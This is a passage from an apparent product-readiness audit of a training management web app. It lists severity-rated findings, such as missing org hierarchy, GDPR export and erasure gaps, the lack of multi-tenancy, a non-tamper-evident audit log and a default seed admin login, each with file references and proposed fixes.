- **Fix:** `passport-saml` or OIDC adapter; map IdP user to local User; provision via SCIM (PROD-009).

### PROD-002 — Critical — No org hierarchy (`managerId`, Department collection)
- **File:** `server/models/User.js:17-189` — no `managerId`. `department` is a free string (line 53).
- **Fix:** Add `Department` collection; `User.managerId`; manager dashboard scoping in `dashboardController`.

### PROD-003 — Critical — System is Training Ops, not LMS
- No `Course/Module/Lesson/Quiz/QuizAttempt/Certificate/LearningPath` collections. `Class` is a cohort.
- **Fix:** New collections; in-app quiz UI; PDF certificate render.

### PROD-004 — High — GDPR gaps
- No `/api/users/:id/export` (right to portability).
- No hard-purge (right to be forgotten); `AuditLog.action` enum includes `'erased'` but no controller writes it.

### PROD-005 — High — Multi-tenant absent
- Every collection assumes one org.
- **Fix:** Add `tenantId` to every collection; scoping middleware after `protect`; partial unique indexes prefixed by `tenantId`. ~3–6 engineer-weeks (full list of touch points in the audit Architecture section).

### PROD-006 — High — AuditLog not tamper-evident
- **File:** `server/models/AuditLog.js`
- Append-only by convention; no hash chain. A DB admin can delete or edit any row silently.
- **Fix:** Hash-chain (each record stores prev-hash).

### PROD-007 — Medium — Whitelabel branding hard-coded
- `client/src/pages/LoginPage.jsx:75-78` hard-codes `TMS.` wordmark; no per-tenant logo/color.

### PROD-008 — Medium — Default seed `000001 / admin12345`
- `server/seed.js:9-15`; QuickFill button in `LoginPage` (guarded by `import.meta.env.DEV` but should be deleted from production build).

### PROD-009 — Medium — No API key + signed webhook + retry
- No HRIS integration possible today.

### PROD-010 — Medium — No in-app notification model
- Email only via `lib/emailTemplates.js`.
